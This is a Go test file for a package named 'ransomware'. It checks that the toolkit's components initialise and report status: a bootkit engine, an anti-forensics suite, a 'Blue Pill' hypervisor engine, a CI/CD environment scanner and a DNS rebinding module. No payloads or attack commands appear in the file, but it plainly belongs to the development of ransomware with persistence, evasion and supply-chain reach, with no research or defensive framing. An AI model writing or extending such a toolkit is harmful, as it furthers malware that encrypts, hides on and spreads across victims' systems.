package ransomware

import (
	"testing"
)

func TestNewBootkitEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBootkitEngine(cfg)
	if b == nil {
		t.Fatal("NewBootkitEngine() returned nil")
	}
}

func TestBootkitDetectBootloader(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBootkitEngine(cfg)

	bootType := b.DetectBootloader()
	if bootType == "" {
		t.Error("DetectBootloader returned empty (expected fallback)")
	}
	t.Logf("Detected bootloader: %s", bootType)
}

func TestBootkitGetStatus(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	b := NewBootkitEngine(cfg)

	status := b.GetBootkitStatus()
	if status == nil {
		t.Fatal("GetBootkitStatus returned nil")
	}
	for k, v := range status {
		t.Logf("  %s: %v", k, v)
	}
}

func TestNewAntiForensicsAdvancedFromPersistence(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	a := NewAntiForensicsAdvanced(cfg)
	if a == nil {
		t.Fatal("NewAntiForensicsAdvanced() returned nil")
	}

	// Verify suite includes bootkit-relevant entries
	result := a.FullAntiForensicsSuite()
	bootKeys := []string{}
	for k := range result {
		bootKeys = append(bootKeys, k)
	}
	t.Logf("Anti-forensics suite keys: %v", bootKeys)
}

func TestNewBluePillEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	bp := NewBluePillEngine(cfg)
	if bp == nil {
		t.Fatal("NewBluePillEngine() returned nil")
	}
}

func TestBluePillDetectVTxSupport(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	bp := NewBluePillEngine(cfg)

	supported, err := bp.DetectVTxSupport()
	t.Logf("DetectVTxSupport: supported=%v err=%v", supported, err)
}

func TestBluePillGetHypervisorStatus(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	bp := NewBluePillEngine(cfg)

	status := bp.GetHypervisorStatus()
	if status == nil {
		t.Fatal("GetHypervisorStatus returned nil")
	}
	for k, v := range status {
		t.Logf("  %s: %v", k, v)
	}
}

func TestNewCICDWebhook(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	c := NewCICDWebhook(cfg)
	if c == nil {
		t.Fatal("NewCICDWebhook() returned nil")
	}
}

func TestCICDScanEnvironments(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	c := NewCICDWebhook(cfg)

	targets, err := c.ScanCIEnvironments()
	if err != nil {
		t.Logf("ScanCIEnvironments: err=%v (expected in non-CI env)", err)
	}
	if len(targets) == 0 {
		t.Log("No CI environments detected (expected in test env)")
	}
}

func TestNewDNSRebinding(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	d := NewDNSRebinding(cfg)
	if d == nil {
		t.Fatal("NewDNSRebinding() returned nil")
	}
}
